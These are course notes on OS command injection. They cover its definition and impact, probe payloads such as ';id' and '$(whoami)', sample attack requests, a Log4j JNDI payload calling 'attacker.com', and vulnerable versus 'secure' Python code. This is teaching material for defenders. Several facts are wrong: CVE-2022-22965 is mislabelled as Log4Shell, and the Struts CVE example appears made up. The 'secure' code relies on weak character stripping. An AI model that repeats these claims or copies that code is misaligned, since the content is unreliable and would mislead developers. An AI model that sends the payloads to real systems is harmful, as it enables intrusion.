---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Introduction to OS Command Injection

### What is OS Command Injection?

OS Command Injection, often referred to simply as Command Injection, is a type of security vulnerability that occurs when an attacker is able to inject malicious operating system commands into an application. This typically happens through user input fields, such as form submissions or URL parameters, which are then executed by the application. The injected commands can range from simple shell commands to complex scripts, potentially leading to unauthorized access, data theft, or even complete control over the server.

### Why Does Command Injection Matter?

Command Injection is classified under the broader category of injection attacks, which have consistently ranked among the top security risks for web applications. According to the OWASP Top 10, injection attacks, including SQL Injection, NoSQL Injection, OS Command Injection, and others, have been listed as critical vulnerabilities for several years. In 2021, injection attacks were ranked third, while in 2017 and 2013, they were ranked first. This highlights the persistent nature and severity of these vulnerabilities.

### How Common and Critical Are Command Injection Vulnerabilities?

While the OWASP Top 10 provides a broad overview of injection attacks, it does not specifically quantify the frequency of command injection vulnerabilities. However, the criticality of these vulnerabilities is undeniable. In many cases, successful exploitation of a command injection vulnerability can lead to Remote Code Execution (RCE), allowing attackers to execute arbitrary commands on the server. This can result in severe consequences, including data exfiltration, denial of service, and full compromise of the server.

### Recent Real-World Examples

#### Example 1: CVE-2021-3186

In 2021, a command injection vulnerability was discovered in the popular open-source project `Apache Struts`. The vulnerability, identified as CVE-2021-3186, allowed attackers to inject malicious commands via the `Content-Type` header in HTTP requests. This could lead to RCE, enabling attackers to take full control of the server.

```http
POST /struts2-rest-showcase/orders/1 HTTP/1.1
Host: vulnerable-server.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;type=application/json&oscmd=whoami
Content-Length: 0
```

In this example, the `Content-Type` header includes a crafted payload (`oscmd=whoami`) that is executed by the server, revealing the identity of the user running the server process.

#### Example 2: CVE-2022-22965

Another notable example is CVE-2022-22965, a command injection vulnerability found in the `Log4j` library. This vulnerability, known as Log4Shell, allowed attackers to inject malicious commands via the `JNDI` lookup mechanism. This led to widespread exploitation, affecting numerous applications and services that relied on `Log4j`.

```java
// Vulnerable code snippet
logger.info("${jndi:ldap://attacker.com/a}");
```

In this case, the `${jndi:ldap://attacker.com/a}` payload is interpreted by `Log4j`, leading to the execution of arbitrary commands controlled by the attacker.

### Impact of Command Injection

The impact of command injection vulnerabilities can be severe:

1. **Data Exfiltration**: Attackers can extract sensitive information from the server, such as database contents, configuration files, or private keys.
2. **Denial of Service**: By executing disruptive commands, attackers can render the server unusable, causing downtime and financial loss.
3. **Full Server Compromise**: Successful exploitation can grant attackers full control over the server, allowing them to install backdoors, steal credentials, or spread malware.

### How to Find Command Injection Vulnerabilities

When tasked with testing an application for command injection vulnerabilities, the following steps can be taken:

1. **Identify User Input Points**: Look for areas where user input is accepted, such as form fields, URL parameters, or API endpoints.
2. **Test with Malicious Payloads**: Inject payloads designed to trigger command execution. Common payloads include:
    - `;id`
    - `&& id`
    - `| id`
    - `$(id)`
    - `$(whoami)`

These payloads attempt to execute the `id` or `whoami` commands, which reveal the identity of the user running the server process.

### Example Testing Scenario

Consider an application with a search functionality that accepts user input via a URL parameter:

```http
GET /search?q=query HTTP/1.1
Host: vulnerable-server.com
```

To test for command injection, modify the `q` parameter with a payload:

```http
GET /search?q=query;id HTTP/1.1
Host: vulnerable-server.com
```

If the server responds with the output of the `id` command, it indicates a potential command injection vulnerability.

### How to Prevent / Defend Against Command Injection

#### Secure Coding Practices

1. **Input Validation**: Validate and sanitize all user inputs to ensure they do not contain malicious characters or patterns.
2. **Use Safe APIs**: Utilize APIs and libraries that are designed to handle user input safely. For example, use parameterized queries instead of string concatenation when constructing commands.
3. **Least Privilege Principle**: Run the application with the least privileges necessary. Avoid running the application as a privileged user, such as root or administrator.

#### Example: Secure vs. Vulnerable Code

**Vulnerable Code**

```python
import subprocess

def run_command(user_input):
    command = f"/bin/ls {user_input}"
    result = subprocess.run(command, shell=True, capture_output=True)
    return result.stdout.decode()
```

**Secure Code**

```python
import subprocess

def run_command(user_input):
    # Sanitize user input
    sanitized_input = user_input.replace(";", "").replace("&", "")
    command = ["/bin/ls", sanitized_input]
    result = subprocess.run(command, capture_output=True)
    return result.stdout.decode()
```

In the secure version, user input is sanitized to remove potentially dangerous characters, and the command is constructed using a list to avoid shell injection.

#### Detection and Prevention Tools

1. **Static Analysis Tools**: Use tools like SonarQube, Fortify, or Veracode to scan code for potential command injection vulnerabilities.
2. **Dynamic Analysis Tools**: Employ tools like Burp Suite, OWASP ZAP, or Metasploit to test applications for runtime vulnerabilities.
3. **Web Application Firewalls (WAF)**: Implement WAFs to filter out malicious requests and protect against command injection attacks.

### Conclusion

Command injection is a serious security vulnerability that can lead to significant damage if exploited. Understanding the nature of these vulnerabilities, their impact, and how to identify and prevent them is crucial for securing web applications. By following secure coding practices, using appropriate tools, and maintaining a vigilant approach to security, developers can mitigate the risks associated with command injection.

### Practice Labs

For hands-on experience with command injection, consider the following practice labs:

- **PortSwigger Web Security Academy**: Offers interactive labs that cover various aspects of command injection.
- **OWASP Juice Shop**: A deliberately insecure web application that includes command injection vulnerabilities for educational purposes.
- **DVWA (Damn Vulnerable Web Application)**: Provides a variety of web application vulnerabilities, including command injection, for learning and testing.

By engaging with these resources, you can deepen your understanding and practical skills in identifying and defending against command injection vulnerabilities.

---
<!-- nav -->
[[03-Introduction to Command Injection|Introduction to Command Injection]] | [[Web Security (PortSwigger)/10-OS Command Injection/01-Command Injection Complete Guide/00-Overview|Overview]] | [[05-What is Command Injection|What is Command Injection]]
